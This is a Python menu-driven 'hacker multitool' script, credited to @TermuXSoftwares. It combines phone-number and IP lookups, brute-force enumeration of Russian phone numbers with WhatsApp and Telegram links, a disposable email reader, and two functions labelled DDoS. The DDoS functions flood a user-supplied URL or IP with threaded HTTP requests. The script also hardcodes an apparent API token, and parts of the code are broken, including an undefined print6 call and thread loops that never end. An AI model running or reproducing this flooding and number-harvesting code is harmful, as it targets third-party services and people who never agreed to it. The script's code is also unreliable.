import requests, threading, time, random, string, json, os, sys, subprocess
from pystyle import Colorate, Colors
from bs4 import BeautifulSoup

def search_phone(phone_number):
    url = f"http://num.voxlink.ru/get/?num={phone_number}"
    response = requests.get(url)
    data = response.json()
    return data

def search_ip(ip):
    url = f"http://ipwho.is/{ip}"
    response = requests.get(url)
    data = response.json()
    return data

def search_url(url):
    uri = "https://whoisjson.com/api/v1/whois"
    querystring = {"domain":url}
    headers = {
        "Authorization": "Token=dbbc251dda62fb51321132d79b070d00cad48acec4c660f7f0b313eb09056e9b"
    }
    response = requests.request("GET", uri, headers=headers, params=querystring)
    print(response.text)

def ddos_ip(ip, number_of_threads, duration):
    def attack():
        while True:
            try:
                response = requests.get(f"http://{ip}")
                print(f"Request sent to {ip}. Response status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
            time.sleep(1)

    threads = []
    for _ in range(number_of_threads):
        t = threading.Thread(target=attack)
        threads.append(t)
        t.start()

    time.sleep(duration)

    for t in threads:
        t.join()

def ddos_attack(url, number_of_threads, duration):
    def attack():
        while True:
            try:
                response = requests.get(url)
                print(f"Request sent to {url}. Response status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
            time.sleep(1)

    threads = []
    for _ in range(number_of_threads):
        t = threading.Thread(target=attack)
        threads.append(t)
        t.start()

    time.sleep(duration)

    for t in threads:
        t.join()

def search_russian_phone_numbers(prefix, length, num_results=10, random_order=False):
    numbers = []
    start = 10 ** (length - 1)
    end = 10 ** length
    if random_order:
        numbers = random.sample(range(start, end), num_results)
    else:
        numbers = range(start, end)

    valid_numbers = []
    for i in numbers:
        phone_number = f"+7{prefix}{i}"
        result = search_phone(phone_number)
        if result['operator'] != "Не определено":
            print(f"Valid phone number: {phone_number}")
            print(f"What`s App: https://wa.me/{phone_number}")
            print(f"Telegram: https://t.me/{phone_number}")            
            valid_numbers.append(phone_number)
        if len(valid_numbers) >= num_results:
            break

    return valid_numbers
    
def temp_mail():
    # Generate a temporary email address using the 1secmail API
    mail = requests.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1").json()[0]
    print(f"Your temporary email address is: {mail}")

    # Extract the login and domain parts from the email address
    login, domain = mail.split('@')

    # Wait for new messages and print them
    while True:
        response = requests.get(f"https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}")
        messages = response.json()
        if messages:
            for message in messages:
                if '1secmail.com' not in message['from']:
                    print(f"From: {message['from']}")
                    print(f"Subject: {message["subject"]}")
                    message_id = message['id']
                    message_body = requests.get(f"https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={message_id}").json()['body']
                    print(f"Message Body:\n{message_body}")
        time.sleep(1)  # Wait for 10 seconds before checking for new messages
        
def main():
    print(Colorate.Horizontal(Colors.blue_to_green, '''
          
                                          ██████  ██▓     ▄▄▄       ▄████▄   ██ ▄█▀
                                        ▒██    ▒ ▓██▒    ▒████▄    ▒██▀ ▀█   ██▄█▒ 
                                        ░ ▓██▄   ▒██░    ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
                                        ▒     ██▒▒██░    ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
                                        ▒██████▒▒░██████▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
                                        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
                                        ░ ░▒  ░ ░░ ░ ▒  ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ 
                                        ░  ░  ░    ░ ░     ░   ▒   ░        ░ ░░ ░ 
                                        ░      ░      ░      ░  ░░ ░      ░  ░   
                                            ░    
                           
                                              Version 2.0 By: @TermuXSoftwares      

'''))
    while True:
        print(Colorate.Horizontal(Colors.blue_to_green, '''
                                                              
                                                    [1] Phone Search         
                                                    [2] Rus Numbers Brute       
                                                    [3] Temporary email            
                                                    [4] IP Search          
                                                    [5] DDoS IP                   
                                                    [6] DDoS
                                                    [7] Exit
'''))
        choice = input(Colorate.Horizontal(Colors.blue_to_green, '''
                                              ┌───(User@Slack)─[~/Slack/Menu-1]      
                                              └──$: '''))
        print()
        if choice == "1":
            phone_number = input(Colorate.Horizontal(Colors.blue_to_green, "Enter a phone number (+79999999999): "))
            if phone_number == "" or phone_number == " " or phone_number == "7":
                print("Phone number is empty")
            else:
                result = search_phone(phone_number)
                print(f"Number: {phone_number}")
                print(f"Operator: {result['operator']}")
                print(f"Region: {result['region']}")
                print(f"What`s App: https://wa.me/{phone_number}")
                print(f"Telegram: https://t.me/{phone_number}")
        elif choice == "3":
            temp_mail()
        elif choice == "4":
            ip = input(Colorate.Horizontal(Colors.blue_to_green, "Enter an IP address: "))
            if ip == "" or ip == " " or ip == "7":
                print("IP is empty")
            else:
                result = search_ip(ip)
                print(f"IP: {result['ip']}")
                print(f"Continent: {result['continent']}")
                print(f"Country: {result['country']}")
                print(f"Region: {result['region']}")
                print(f"City: {result['city']}")
                print(f"Timezone: {result['timezone']}")
                print(f"Latitude: {result['latitude']}")
                print(f"Longitude: {result['longitude']}")
        elif choice == "6":
            url = input(Colorate.Horizontal(Colors.blue_to_green, "Enter the URL to attack: "))
            if url == "" or url == " " or url == "6":
                print("URL is empty")
            else:
                number_of_threads = int(input(Colorate.Horizontal(Colors.blue_to_green, "Enter the number of threads: ")))
                duration = int(input(Colorate.Horizontal(Colors.blue_to_green, "Enter the duration of the attack (in seconds): ")))
                ddos_attack(url, number_of_threads, duration)
        elif choice == "5":
            ip = input(Colorate.Horizontal(Colors.blue_to_green, "Enter the IP address to attack: "))
            if ip == "" or ip == " " or ip == "6":
                print("IP is empty")
            else:
                number_of_threads = int(input(Colorate.Horizontal(Colors.blue_to_green, "Enter the number of threads: ")))
                duration = int(input(Colorate.Horizontal(Colors.blue_to_green, "Enter the duration of the attack (in seconds): ")))
                ddos_ip(ip, number_of_threads, duration)
        elif choice == "2":
            prefix = input(Colorate.Horizontal(Colors.blue_to_green, "Enter the prefix of the phone number (e.g., 999): "))
            if prefix == "" or prefix == " " or prefix == "6":
                print("Prefix is empty")
            else:
                length = int(input(Colorate.Horizontal(Colors.blue_to_green, "Enter the length of the phone number (e.g., 7): ")))
                num_results = int(input(Colorate.Horizontal(Colors.blue_to_green, "Enter the number of results to return (default: 10): ")))
                random_order = input(Colorate.Horizontal(Colors.blue_to_green, "Search in random order? (y/n, default: n): ")).lower() == 'y'
                valid_numbers = search_russian_phone_numbers(prefix, length, num_results, random_order)
                print(f"\nFound {len(valid_numbers)} valid phone numbers:")
                for number in valid_numbers:
                    print6(number)
        elif choice == "75253235235235":
            print("No threads to exit.")
        elif choice == "7":
            print("Exiting...")
            exit(1)
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting...")
        exit(1)